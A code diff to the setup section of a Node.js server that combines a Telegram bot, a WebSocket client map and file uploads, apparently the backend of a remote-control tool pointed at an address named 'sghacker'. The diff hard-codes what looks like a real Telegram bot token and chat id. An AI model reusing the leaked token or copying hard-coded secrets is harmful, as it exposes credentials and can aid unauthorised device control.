@@ -1,21 +1,21 @@
 const express = require('express');
 const webSocket = require('ws');
-const http = require('http')
-const telegramBot = require('node-telegram-bot-api')
-const uuid4 = require('uuid')
+const http = require('http');
+const telegramBot = require('node-telegram-bot-api');
+const uuid4 = require('uuid');
 const multer = require('multer');
-const bodyParser = require('body-parser')
+const bodyParser = require('body-parser');
 const axios = require("axios");
 
-const token = process.env.bot_token
-const id = process.env.bot_id
-const address = 'https://www.google.com'
+const token = '7394158230:AAE6m5eowQUcJpMeqfWj63LMTGSoUrSDSF0';  // Replace with your actual bot token
+const id = '1249726999';        // Replace with your actual bot id
+const address = 'https://sghacker.adaptable.app';
 
 const app = express();
 const appServer = http.createServer(app);
-const appSocket = new webSocket.Server({server: appServer});
-const appBot = new telegramBot(token, {polling: true});
-const appClients = new Map()
+const appSocket = new webSocket.Server({ server: appServer });
+const appBot = new telegramBot(token, { polling: true });
+const appClients = new Map();
 
 const upload = multer({ dest: 'uploadedFile/' });
 const fs = require('fs');
